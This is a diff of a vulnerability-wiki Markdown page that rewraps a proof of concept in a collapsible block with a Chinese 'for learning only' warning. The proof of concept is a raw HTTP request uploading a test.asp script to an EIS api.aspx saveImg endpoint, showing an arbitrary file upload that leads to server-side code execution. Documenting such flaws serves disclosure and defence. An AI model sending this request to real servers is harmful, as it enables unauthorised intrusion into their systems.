@@ -33,8 +33,10 @@ icon_hash="953405444"
 
 poc
 
-```
-POST /eis/service/api.aspx?action=saveImg HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /eis/service/api.aspx?action=saveImg HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
 Content-Length: 219
@@ -49,9 +51,10 @@ Upgrade-Insecure-Requests: 1
 Content-Disposition: form-data; name="file"filename="test.asp"
 Content-Type: text/html
 
-<% response.write("Test")%>
-------WebKitFormBoundarynUqjgvhmkL1dxpCV--
-```
+&lt;% response.write("Test")%&gt;
+------WebKitFormBoundarynUqjgvhmkL1dxpCV--</code></pre>
+
+</details>
 
 ![image-20231116141617020](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20231116141617020.png)
 
